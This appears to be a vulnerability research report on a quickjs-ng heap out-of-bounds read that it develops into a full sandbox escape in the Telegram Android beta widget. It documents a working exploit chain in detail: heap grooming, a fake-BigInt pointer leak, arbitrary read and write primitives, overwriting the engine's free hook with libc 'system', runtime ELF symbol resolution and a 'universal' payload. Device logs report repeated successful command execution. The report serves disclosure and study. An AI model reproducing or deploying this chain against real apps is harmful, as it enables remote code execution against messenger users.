| `S2 pv=0x… F=0x… off=…` | fake-BigInt leak of pvalue and buffer base; `off` is the probed pvalue offset |
| `S2 NOFRAME` | frame not reused at a probed offset (buf2 mapping mismatch) |
| `S3 ctx=… rt=… jsf=…` | JSContext/JSRuntime and rt+16 read |
| `S3b A magic=0x464c457f free=… sys=…` | branch A (ELF base check passed) |
| `S3b B magic=… free=… sys=…` | branch B (rt+16 treated as libc free) |
| `S4 writer ok` | fake Uint8Array arbitrary write ready |
| `S5 rt16=… rt64=…` | hook readback (must equal sys/command address) |
| `S6` | 4096-byte free executed; `system(command)` should have run |
| `ERR …` | exception text |
| no `S1` / crash | OOB slot missed b0 (retry b0 size 1.5/2 MB or a second b0b) |

Device risks (open): Scudo secondary guard placement must let the +524 KB
slot land in b0 rather than a guard page; `buf2` must reuse the frame mapping.
The offset probe handles frame-size drift only.


### 3B.6 Device runs 2/3 (tombstone_16/17): teardown and fake-refcount fixes

**Tombstone_16 (teardown).** The second device run reached the fake-BigInt
read but crashed in `SandboxEngine_runTask` cleanup (`sub_17B0E3C+0x270`,
pc `0x17b10ac`). The fake BigInt points into the real `JSVarRef`; when the
script-local `big` was freed at scope exit, the engine freed/corrupted that
var_ref/GC list. Fix: pin the engine objects on `globalThis` before the
scope can exit (`b0, v0, it, f, V, buf2, dv`; the fake `reader`/`w` stay
global too because their refcounts live in buf2). The fake BigInt itself is
**not** pinned (see below).

**Tombstone_17 (fake refcount).** The width-adaptive `>>`/`asUintN` decoder
still crashed: the BigInt *operator* path calls `sub_1715E30`, which reads
the fake refcount at `P-4`. With `P=V+0x0C` that is the low 32 bits of the
GC-link pointer at `V+0x08`; bit 31 is set, `SUBS W8,W8,#1` stays negative,
and the engine calls `__JS_FreeValueRT` on the fake BigInt (wild free). A
persistent `globalThis.big` also writes that refcount.

Final device-safe layout (confirmed against the tombstone bytes):

* **39-bit device heap:** `P = V+0x14`. The fake refcount at `V+0x10` is the
  flags/pad word `0x01000000` (positive), `len` at `V+0x14` is `0x77`,
  `tab = V+0x18 = pvalue`, so `pv` = bits 0..63 and `sf` = bits 128..191.
  Only `big.toString(16)` is used on the fake BigInt (read-only); the local
  free at scope exit decrements `0x01000000` -> `0x00FFFFFF` and never frees.
* **47-bit lab/guard:** `P = V+0x0D`, `tab = V+0x11` (pvalue at bit 56,
  stack_frame at bit 184); same read-only `toString` path.

The magnitude is parsed with a **real** BigInt:

```
hs = big.toString(16); neg = hs[0]=='-'; mag = BigInt('0x'+hs)
len = device39 ? (V>>32)&0xff : (V>>40)&0xff
raw = neg ? (1n << (32*len)) - mag : mag
pv  = (raw >> pvShift) & 0xFFFFFFFFFFFFFFFFn     // pvShift 0 (device), 56 (47-bit)
sf  = (raw >> sfShift) & 0xFFFFFFFFFFFFFFFFn     // sfShift 128 (device), 184 (47-bit)
```

Node validation against the tombstone_17 bytes (`V=0x77575434d0`,
tab limbs `e5de8f08 b4000076 0000fffd 00000000 a50b2aa8 00000077`):

```
len 77
pv 0xb4000076e5de8f08
sf 0x77a50b2aa8          # exactly the tombstone values
```

Guard-model validation of the final payload:

| path | run environment | runs | result |
|---|---|---|---|
| 39-bit device path (P=V+0x14, shifts 0/128) | guard allocator at `0x7700000000` + instrumented engine sets `V+0x14=0x77` | 5 | **5/5** S0..S6 + proof |
| 47-bit fallback (P=V+0x0D, shifts 56/184) | standard guard model | 5 | **5/5** S0..S6 + proof |

39-bit device-path run:

```
S1 V=0x76ff657c50 off=516016
S2 pv=0x76ff550f08 F=0x76ff450f38 off=1048528
S3 ctx=0x76fffe0db0 rt=0x76ffffea38 jsf=0x565296ae1f20
S3b A magic=0x464c457f free=0x7fef59da4fc0 sys=0x7fef59d55090
S4 writer ok | S5 rt16=0x7fef59d55090 rt64=0x76ff452f38 | S6
```

Proof: `uid=1000(user)…`. Device offsets to compare: **S1 off=516016**,
**S2 off=1048528**.

**Can the guard model validate the device path?** Yes, but only with the
device's stale `0x77` byte at `V+0x14`: a fresh zeroed arena gives `len=0`
and the fake BigInt is invalid. The lab uses an instrumented engine that
writes `0x77` into the JSVarRef padding at allocation (the device has it
naturally, per tombstone_15/17). The 47-bit fallback validates in the
unmodified guard model.


### 3B.7 Universal arm64 payload (no per-device padding byte, no libc delta)

`poc/widget_poc_1865_universal.html` (8.3 KB) removes the two remaining
per-device constants. The APK-fixed offsets stay (`js_def_free=0x1739aec`,
`free@GOT=0x1960430`); the libc delta is now only a fallback.

**1. Direction-independent groom.** `b0a` (1 MB) is allocated after the
source eval and before `g()`; `b0b` (1 MB) after `g()` and before the first
`next()`. Top-down mmap (Scudo/guard) -> the slot lands in `b0a`; bottom-up
(glibc brk) -> in `b0b`. Both are scanned; the marker is `S1a`/`S1b`.

**2. JSVarRef padding prime (removes the device 0x77).** Before the closure
the body allocates 16 x 48-byte `ArrayBuffer`s, writes `0x41` at `+0x14`,
and drops them; `get_var_ref()`'s `js_malloc(sizeof(JSVarRef))` (48 B, same
arena class) reuses one, so the fake BigInt at `P=V+0x14` always sees
`len=0x41` regardless of pointer width or stale heap bytes. The fake
refcount at `V+0x10` is the flags word (`0x01000000`, positive), and only
`big.toString(16)` is used (no fake-BigInt operators). `tab=V+0x18=pvalue`:
`pv = raw & 2^64-1`, `sf = (raw>>128) & 2^64-1`, on both 39-bit and 47-bit
heaps (no width branch).

**3. Runtime `system` resolution (removes the libc delta).** `free` comes
from the APK GOT; the libc ELF base is found by scanning page-aligned memory
downwards from `free` (<=4 MB) for `\x7fELF` with a matching `e_machine`
(0xB7 arm64 / 0x3E x86-64). The PT_DYNAMIC table is parsed, and `system` is
resolved from `.dynsym` via DT_GNU_HASH (bounded linear fallback). Note:
glibc/bionic relocate `DT_STRTAB`/`DT_SYMTAB`/`DT_HASH`/`DT_GNU_HASH` in the
writable dynamic section, so the parser accepts both relocated pointers and
link-time vaddrs. Marker `S3b ELF` on success; `S3b table` uses the known
delta `free+0x26df0` as a fallback.

**4. Frame-reuse probe.** `buf2 = new ArrayBuffer(1,048,912)` (measured
frame for the primed body) and the `pvalue` offset is probed at
`65533*16 + d` for `d in [-2048, +232]` in 8-byte steps; `S2 NOFRAME` if no
offset returns the 1.234567 marker.

Validation (exact widget script, DOM/rAF stubbed, 5 runs each):

| environment | heap direction | groom hit | prime | system | result |
|---|---|---|---|---|---|
| guard, 47-bit (`0x7f…`) | top-down mmap | `S1a` off=515976 | len=0x41 (hl=512) | `S3b ELF` | **5/5** proof |
| guard, 39-bit (`0x76…`) | top-down mmap | `S1a` off=515976 | len=0x41 (hl=512) | `S3b ELF` | **5/5** proof |
| app model, glibc brk (`0x55…`) | bottom-up | `S1b` off=524152 | len=0x41 (hl=512) | `S3b ELF` | **5/5** proof |

Representative 47-bit run:

```
S0 | S1a V=0x7f4f025a9da0 off=515976
S2 pv=0x7f4f022b6e80 F=0x7f4f021b6eb0 off=1048528 hl=512
S3 ctx=0x7f4f02629db0 rt=0x7f4f0292ea38 jsf=0x55f81b16cf20
S3b ELF magic=0x464c457f free=0x7f4f026dcfc0 sys=0x7f4f0268d090
S4 writer ok | S5 rt16=0x7f4f0268d090 rt64=0x7f4f021b8eb0 | S6
```

Bottom-up app-model run: `S1b … off=524152`, same `S2`/`S3b ELF`/`S6`, proof
`uid=1000(user)…`. Peak JS memory for the whole layout: **4,821,760 B**
(2 MB groom + 1 MB frame + 1 MB buf2 + parse); wall time ~80 ms on x86
including process start.

Device procedure is unchanged (§3B.5), payload path
`poc/widget_poc_1865_universal.html`. Markers `S1a`/`S1b` tell which groom
buffer received the leaked `JSVarRef*`; `S3b ELF` means `system` came from
libc `.dynsym`, `S3b table` means the delta fallback was used.

Residual device risks (not tested on hardware): the libc ELF scan can hit a
`PROT_NONE` gap inside the library on some layouts (the design asks for a
downward scan; the payload bounds it to 4 MB); the frame-reuse probe covers
±2 KB of frame-size drift; the whole chain must fit the 500 ms/script budget
(≈80 ms on x86, arm64 slower).


---

## 4. Honest impact statement

* **Proven:** OOB read of 8 attacker-influenced bytes 512 KB past a 1 MB
  generator frame; dereference of that value as `JSVarRef*`; deterministic
  crash on both the app-era engine (v0.17.0) and v0.18.0; works at 6 MiB with
  no GC stress, no timers, no interrupt, in one eval, ~20–30 ms x86.
* **Proven in the Scudo-like model:** the OOB slot content is attacker-chosen
  (0x41 fill → fault at 0x4141414141414141; 0x00 fill → clean survival and the
  conditional NULL store executes).
* **Proven in the app model (second pass, §3A):** a full chain from the
  #1865 OOB slot to `system(command)`: JSVarRef address leak -> arbitrary
  read -> arbitrary byte write -> `rt->mf.js_free = system`,
  `malloc_state.opaque = command` -> free a >512 B string. The command ran
  (`uid=1000(user)...`) and the engine survived (`[eval 1] ok`).
* **Proven on the phone (2026-11-01):** the chain runs in the real
  `org.telegram.messenger.beta` 13.2.0 widget. The final `P=V+0x14`
  payload produced `S0→S6` and wrote
  `/data/user/0/org.telegram.messenger.beta/cache/rce_proof` (186 B,
  `uid=10357(u0_a357)`, SELinux `untrusted_app`, md5
  `e06bf2b4c01be9db54f49a9776dcf5ee`); 10/10 cold-start runs. The universal
  payload (two-direction groom, 48-byte padding prime `len=0x41`, runtime
  ELF `system` resolution) is 11/11 on the same device and 5/5 in 39-bit,
  47-bit and bottom-up lab models. No crashes.
* **Why it still matters:** it is a *new* app-reachable heap OOB (the previous
  report explicitly wrote it off), it needs only ~131 KB of generated JS,
  and it is now a complete sandbox escape from widget HTML/JS to native
  command execution in the Telegram app process, not just a crash.

---

## 5. Reproduction

Local lab commands below; the device procedure is §3B.5 (final payload) /
§3B.7 (universal). Device results: 10/10 same-target, 11/11 universal.

```bash
# engine builds
/tmp/opencode/qjsng      # v0.17.0, build-asan + build-rel + build-relg (existing)
/tmp/opencode/qjs018     # v0.18.0 HEAD d7215b0, build-asan + build-rel (new)

# app model: 6 MiB, 500 ms, one ctx, no teardown
/tmp/opencode/qjs_postsnapshot/harness/appmodel_v018_rel 6 500 poc1865_dup.js   # SIGSEGV
/tmp/opencode/qjs_postsnapshot/harness/appmodel_v018_rel 6 500 poc1865_dup_1next.js  # ok, mem 2.59 MB

# Scudo-like allocator model (mmap + guard page)
/tmp/opencode/qjs_postsnapshot/harness/guardrt_v018_rel 6 poc1865_dup.js            # survives (layout)
/tmp/opencode/qjs_postsnapshot/harness/guardrt_v018_rel 6 poc1865_dup_groom.js      # SIGSEGV @ 0x4141…
/tmp/opencode/qjs_postsnapshot/harness/guardrt_v018_rel 6 poc1865_dup_groom_zero.js # survives 10/10

# ASan
ASAN_OPTIONS=quarantine_size_mb=0:thread_local_quarantine_size_kb=0 \
  /tmp/opencode/qjs018/build-asan/qjs poc1865_dup.js
```

Rebuild:

```bash
sh harness/build_postsnapshot.sh /tmp/opencode/qjsng /tmp/opencode/qjs018
```

---

## 6. Artifacts

`/tmp/opencode/qjs_postsnapshot/`

| Path | Content |
|---|---|
| `REPORT.md` | this report |
| `pocs/poc1865_dup.js` | minimal trigger (131 KB) |
| `pocs/poc1865_dup_groom.js` | 1 MB buffer filled `0x41` → controlled pointer |
| `pocs/poc1865_dup_groom_zero.js` | 1 MB buffer filled `0x00` → survival |
| `pocs/poc1865_dup_1next.js` | one resume (memory measurement) |
| `pocs/sweep_6552*.js` | parameter-count sweep |
| `pocs/gm_pre_*m_*.js` | pre/post allocation grooming matrix |
| `harness/appmodel.c` | app model (6 MiB, deadline, no teardown) |
| `harness/guardrt.c` | Scudo-like mmap+guard allocator model |
| `harness/build_postsnapshot.sh` | rebuild script |
| `harness/instr_patch.py` | the two `fprintf` probes used for the measurements |
| `logs/` | ASan, gdb, allocator-model, memory, `final_summary.txt` logs |
| `diffs/` | raw `.diff` of every post-snapshot PR examined |

Copied to the project at
`telegramandroidwidget/notes/qjs_postsnapshot_f1865_report.md` and
`telegramandroidwidget/lab/qjs_postsnapshot/`.

---

## 7. Limitations

* The app-allocator model is a model. mmap placement on the device depends on
  Scudo's secondary-region policy and on what the messenger allocated before
  the widget ran; the groomed-`ArrayBuffer` placement that works in the model
  must be confirmed on-device (or under a Frida-controlled allocator trace).
* `/proc/self/maps`-based `slot mapping` evidence is from the lab host.
* The stale-frame/`ArrayBuffer` leak-and-reuse chain attributed to the
  upstream reporter was not implemented; no address leak was produced.
* No binary disassembly of `async_func_init` in the shipped `.so` (stripped;
  only named functions in the annotated IDB were used).

---

## 8. New beta 72799 — rebuild compatibility (2026-11-01)

`org.telegram.messenger.beta` versionCode **72799** (same versionName 13.2.0)
rebuilt `libtmessages.49.so`: 27,016,000 B vs 26,997,240; BuildId
`645cce3998197329915f6cbfcc9ffd7f124d9f86` vs `5cda53ca…`; `.text` +0x2618,
`.rodata` +0x2000; clang 18.0.3.

The OTA restart re-ran the v2 widget from message 79415 and wrote a fresh
203-B proof (`S3b PLT`, `S6`, `free=0x7af2db7f70`, `sys=0x7af2dded60`).
Controlled campaigns:

- v2: **10/10** proofs, `S3b PLT` 10/10, no crash.
- v3: 3/3 chain, **0/3 proof** — the dynamic `/proc/$PPID/cmdline | tr` command
  failed on the Android shell; v4’s hardcoded beta/release fallback recovered.
- v4: **9/10** proofs, 9/9 `S3b PLT`, one BigInt/var-ref crash
  (`tombstone_20`, fault `0xfffffffffffffffb`, PC `0x1714b3c`).

The runtime PLT/GOT and libc `.dynsym` layers survived the native rebuild; the
quickjs-ng ABI offsets stayed compatible. The v2 payload is the most reliable;
v4 is the most feature-complete. Full detail: `notes/new_beta_72799_report.md`,
`REPORT_COMPLETE.md`, `evidence/evidence_20261101/new_beta_72799/MANIFEST.md`.
